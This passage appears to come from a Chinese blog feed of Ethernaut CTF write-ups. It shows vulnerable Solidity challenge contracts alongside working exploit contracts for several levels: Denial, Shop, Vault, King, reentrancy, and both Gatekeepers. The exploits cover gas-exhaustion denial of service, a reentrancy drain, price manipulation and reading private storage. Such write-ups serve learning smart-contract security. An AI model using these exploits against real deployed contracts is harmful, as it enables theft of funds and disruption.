withdraw 1% to recipient and 1% to owner    function withdraw() public {        uint amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call{value:amountToSend}("");        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] +=  amountToSend;    }    // allow deposit of funds    receive() external payable {}    // convenience function    function contractBalance() public view returns (uint) {        return address(this).balance;    }}</code></pre><p>目的是要阻止owner在withdraw的时候提取到资产。</p><p>如果在调用call函数时没有检查返回值，也没有指定gas，外部调用是一个gas消耗很高的操作的话，就会使得整个交易出现out of gas的错误，交易回滚。</p><p>因此我们有2个方法。，一种是我们可以通过一个循环，来达到耗尽gas的目的。<br>另外一种方式是，可以使用assert函数，这个函数和require比较像，用来做条件检查，assert的特点是当参数为false时，会消耗掉所有的gas。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    Denial challenge;    constructor(address payable addr) public {        challenge = Denial(addr);    }    function exp() public {        challenge.setWithdrawPartner(address(this));        challenge.withdraw();    }    receive() external payable {        assert(false);    }}</code></pre><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;interface Buyer {  function price() external view returns (uint);}contract Shop {  uint public price = 100;  bool public isSold;  function buy() public {    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() >= price && !isSold) {      isSold = true;      price = _buyer.price();    }  }}</code></pre><p>很明显的逻辑漏洞。</p><pre class=" language-1"><code class="language-1">pragma solidity ^0.8.0;contract Exploit {    Shop challenge;    constructor(address addr) public {        challenge = Shop(addr);    }    function price() public returns (uint256) {        if (challenge.isSold()) {            return 90;        }        return 100;    }    function exp() public {        challenge.buy();    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut题解——摘录（上）</title>
      <link href="/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/"/>
      <url>/2022/12/10/Ethernaut%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E6%91%98%E5%BD%95(%E4%B8%8A)/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut题解摘录"><a href="#Ethernaut题解摘录" class="headerlink" title="Ethernaut题解摘录"></a>Ethernaut题解摘录</h1><h2 id="vault"><a href="#vault" class="headerlink" title="vault"></a>vault</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Vault {  bool public locked;  bytes32 private password;  constructor(bytes32 _password) {    locked = true;    password = _password;  }  function unlock(bytes32 _password) public {    if (password == _password) {      locked = false;    }  }}</code></pre><p>要 unlock 这个合约账户，也就是要找到 password。虽然 password 被设为了 private，但是以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量。，所以只要 getStorageAt 就可以了。</p><pre class=" language-l"><code class="language-l">await web3.eth.getStorageAt(instance, 1)// 0 为 locked 的位置，1 为 password</code></pre><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract King {  address king;  uint public prize;  address public owner;  constructor() payable {    owner = msg.sender;      king = msg.sender;    prize = msg.value;  }  receive() external payable {    require(msg.value >= prize || msg.sender == owner);    payable(king).transfer(msg.value);    king = msg.sender;    prize = msg.value;  }  function _king() public view returns (address) {    return king;  }}</code></pre><p>很明显可以通过看到receive函数中只要我们满足require的条件，就可以篡改合约的king。而题目说明中告知，当我们submit instance 时本关会尝试回收“王权”，也就是它会传入一个更大的msg.value，修改king为原来的msg.sender，为了阻止这一点，我们可以通过在合约的receive或者fallback函数中加入revert函数来实现。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    constructor(address challenge) public payable {        challenge.call.gas(10000000).value(msg.value)("");    }    fallback() external {        revert();    }}</code></pre><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.6.12;import 'openzeppelin-contracts-06/math/SafeMath.sol';contract Reentrance {    using SafeMath for uint256;  mapping(address => uint) public balances;  function donate(address _to) public payable {    balances[_to] = balances[_to].add(msg.value);  }  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }  function withdraw(uint _amount) public {    if(balances[msg.sender] >= _amount) {      (bool result,) = msg.sender.call{value:_amount}("");      if(result) {        _amount;      }      balances[msg.sender] -= _amount;    }  }  receive() external payable {}}</code></pre><p>经典的重入漏洞。<br>原因是call函数它没有gas的限制。</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract attack {    address payable target;    address payable public owner;    uint amount = 1000000000000000 wei;    constructor(address payable _addr) public payable {        target=_addr;        owner = msg.sender;    }    function step1() public payable{        bool b;        (b,)=target.call{value: amount}(abi.encodeWithSignature("donate(address)",address(this)));        require(b,"step1 error");    }    function setp2() public payable {        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"step2 error");    }    fallback () external payable{        bool b;        (b,)=target.call(abi.encodeWithSignature("withdraw(uint256)",amount));        require(b,"fallback error");    }    function mywithdraw() external payable{        require(msg.sender==owner,'not you');        msg.sender.transfer(address(this).balance);    }}</code></pre><h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperOne {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    require(gasleft() % 8191 == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),"");      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "");      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "");    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>msg.sender != tx.origin：即通过一个合约来间接调用 enter。<br>gasleft() % 8191 == 0：运行到这一步时剩余的 gas 要是 8191 的倍数。<br>输入的 _gateKey 满足三个条件。<br>第一个好办，直接写一个合约绕过就好。<br>第二个我是直接是爆破x，因为gas消耗总归是有个范围的，我们只需要在这个范围内爆破即可。</p><pre class=" language-l"><code class="language-l">function exploit() public {        bytes8 key=0xAAAAAAAA00004261;        bool result;        for (uint256 i = 0; i < 120; i++) {            (bool result, bytes memory data) = address(                target            ).call{gas:i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",key));            if (result) {                break;            }        }</code></pre><p>第三个是一个简单的类型转换。<br><a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256">https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256</a>.</p><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract GatekeeperTwo {  address public entrant;  modifier gateOne() {    require(msg.sender != tx.origin);    _;  }  modifier gateTwo() {    uint x;    assembly { x := extcodesize(caller()) }    require(x == 0);    _;  }  modifier gateThree(bytes8 _gateKey) {    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))     ^ uint64(_gateKey) == type(uint64).max);    _;  }  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {    entrant = tx.origin;    return true;  }}</code></pre><p>第一个同样通过合约绕过解决。<br>第二个，其中caller()函数返回call sender，也就是call的发起者，而extcodesize则是返回对应地址的合约代码的大小。如果extcodesize的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。<br>所以攻击代码要写在 constructor 里。<br>第三个，这是一个简单的异或。<br>例子：如果A^B=C;那B^C=A；</p><pre class=" language-l"><code class="language-l">pragma solidity ^0.8.0;contract Exploit {    GatekeeperTwo challenge;    constructor(address addr) public {        challenge = GatekeeperTwo(addr);        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this))))         ^ uint64(0xFFFFFFFFFFFFFFFF);        challenge.enter(bytes8(key));    }}</code></pre>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
